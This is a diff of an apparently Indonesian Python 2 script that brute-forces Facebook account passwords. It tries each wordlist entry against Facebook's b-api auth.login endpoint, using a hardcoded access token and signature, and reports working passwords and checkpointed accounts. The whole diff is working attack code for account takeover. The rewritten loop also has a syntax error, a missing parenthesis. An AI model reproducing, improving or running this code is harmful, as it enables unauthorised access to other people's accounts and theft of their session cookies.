@@ -79,37 +79,27 @@ def brute_fast():
 	    print 
 
 	else:
-	    count = 0
-            jumlah = open("wordlist.txt", "r")
-	    jum = open("wordlist.txt", "r")
-	    jum = jum.readlines()
-	    pas = open("wordlist.txt", "r")
-	    baris = jumlah.read().split()
-	    for password in pas:
-#		if count == len(baris):
-#		    break
-#		pas = password.replace("\n", " ") 
-#		sys.stdout.write("\r Mencoba " + str(count) + " Dari " + str(len(jum)))
-#	 	sys.stdout.flush()
-#		count += 1
-		print password + target
-		urldev = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + password + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                jsl = json.loads(urldev.text)
-            
-
-	
-
-		if "access_token" in jsl:
-		    print
-		    print "[OK] Found : " + password
-
-		else:
-		    if "www.facebook.com" in jsl["error_msg"]:
-		        print
-		        print "[CP] Found : " + password
-
-
-
+	    try:
+                email = target
+                sandi = open("wordlist.txt", "r")
+                san_dev = open("wordlist.txt", "r")
+                for pas in san_dev:
+                    pas = pas.replace("\n", "")
+                    sys.stdout.write("\r Mencoba ==> " + pas
+                    sys.stdout.flush()
+                    Dev_ID = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pas + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                    dev = json.loads(Dev_ID.text)
+                    if "access_token" in dev:
+                        print
+                        print " [OK∆] Found " + pas
+                    elif "www.facebook.com" in dev["error_msg"]:
+                        print
+                        print " [CP∆] Found " + pas
+                    else:
+                        pass
+            except:
+              print "Keluar"
+    
 
 def target():
 	global target
@@ -399,7 +389,7 @@ def wordlist():
 
 		file = open("wordlist.txt", "w")
 		b = "\n"
-		file.write("bangsat \n" )
+		file.write("bangsat"+b +"anjing"+b)
 		file.write(pas1+b +pas2+b +pas3+b +pas4+b +pas5+b +pas6+b +pas7+b +pas8+b +pas9+b +pas10+b)
 		file.write(pas11+b +pas12+b +pas13+b +pas14+b +pas15+b +pas16+b +pas17+b +pas18+b +pas19+b +pas20+b)
 		file.write(pas21+b +pas22+b +pas23+b +pas24+b +pas25+b +pas26+b +pas27+b +pas28+b +pas29+b +pas30+b)
